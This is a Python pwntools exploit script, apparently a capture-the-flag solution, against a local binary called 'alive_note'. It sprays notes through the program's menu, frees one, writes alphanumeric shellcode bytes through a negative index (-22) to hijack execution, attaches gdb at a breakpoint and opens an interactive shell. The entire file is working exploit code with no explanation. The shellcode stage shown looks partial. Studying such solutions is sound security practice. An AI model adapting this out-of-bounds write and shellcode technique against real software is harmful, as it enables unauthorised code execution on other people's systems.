from pwn import * 

p = process("./alive_note") 

def add(idx, name) : 
    p.sendlineafter("Your choice :", "1") 
    p.sendlineafter("Index :", str(idx)) 
    p.sendafter("Name :", name) 

def free(idx) : 
    p.sendlineafter("Your choice :", "3") 
    p.sendlineafter("Index :", str(idx)) 

context.arch = "i386"
shell1 = "\x6A\x61\x58\x34\x61\x74\x46"
with context.verbose : 
    for i in range(33+1428) : 
        add(0, '\x30' * 8) 
    add(1, 'a') 
    for i in range(4) : 
        add(0, '\x30' * 8)
    free(1)  
    add(-22, shell1) 

    gdb.attach(p, "b * 0x080487ae") 
    add(5, '\x90' * 8)
    p.interactive()
